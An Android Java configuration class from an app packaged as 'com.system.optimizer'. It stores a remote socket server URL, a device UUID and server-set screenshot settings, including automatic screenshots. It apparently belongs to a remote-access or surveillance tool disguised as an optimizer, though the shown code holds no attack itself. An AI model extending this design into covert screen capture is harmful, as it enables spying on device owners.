package com.system.optimizer.config;

import com.system.optimizer.R;

import java.util.UUID;

import android.content.Context;
import android.content.SharedPreferences;
import timber.log.Timber;

/**
 * Manages configuration persistence and retrieval.
 * Handles storing and reading config values from SharedPreferences.
 */
public class AppConfig {

    private static final String PREFS_CONFIG = "config_prefs";
    private static final String KEY_SERVER_URL = "config_socket_url";

    private final SharedPreferences prefs;
    private final SharedPreferences.Editor editor;
    private final Context appContext;

    private ConfigData configData;

    public AppConfig(Context context) {
        // Use application context to avoid holding activity context references
        this.appContext = context.getApplicationContext();
        this.prefs = appContext.getSharedPreferences(PREFS_CONFIG, Context.MODE_PRIVATE);
        this.editor = prefs.edit();

        // Check if we have a stored server URL
        String serverUrl = prefs.getString(KEY_SERVER_URL, null);

        if (serverUrl == null || serverUrl.isEmpty()) {
            serverUrl = appContext.getString(R.string.SERVER_URL);
            Timber.d("First run - using SERVER_URL from build: %s", serverUrl);
            editor.putString(KEY_SERVER_URL, serverUrl);
            editor.apply();
        }
        this.configData = new ConfigData(serverUrl, 70, true);
    }

    public void setConfig(ConfigData configData) {
        if (configData == null) {
            Timber.w("setConfig called with null configData");
            return;
        }
        this.configData = configData;
        editor.putString(KEY_SERVER_URL, configData.getServerUrl());
        editor.apply();
    }

    public ConfigData getConfig() {
        return this.configData;
    }

    public String getStoredServerUrl() {
        return configData.getServerUrl();
    }

    /**
     * Serializes a ConfigData instance from a JSON object.
     *
     * @param configJson JSON object containing configuration fields
     * @return The created ConfigData instance
     */
    public static ConfigData createConfigFromJson(org.json.JSONObject configJson) {
        String serverUrl = configJson.optString("server_url", null);
        int screenshotQuality = configJson.optInt("screenshot_quality", 70);
        boolean autoScreenshot = configJson.optBoolean("auto_screenshot", false);

        ConfigData newConfig = new ConfigData(serverUrl, screenshotQuality, autoScreenshot);
        return newConfig;
    }

    public String getUUID() {
        String uuid = prefs.getString("device_uuid", null);
        if (uuid == null) {
            uuid = UUID.randomUUID().toString();
            prefs.edit().putString("device_uuid", uuid).apply();
        }
        return uuid;
    }

}
